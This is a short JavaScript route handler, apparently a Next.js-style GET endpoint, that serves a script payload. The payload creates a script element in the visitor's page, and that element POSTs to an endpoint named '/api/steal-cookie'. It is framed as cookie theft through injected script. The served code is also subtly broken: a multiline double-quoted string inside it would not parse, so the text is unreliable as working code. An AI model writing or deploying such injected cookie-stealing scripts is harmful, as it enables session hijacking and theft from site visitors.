export async function GET() {
    const js = `
     (function () {
      const s = document.createElement('script');
      s.innerHTML = "try {
          fetch('/api/steal-cookie', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            }
          });
        } catch (e) {}";
      document.body.appendChild(s);
      })();
    `;
  
    return new Response(js, {
      headers: {
        "Content-Type": "application/javascript",
      },
    });
}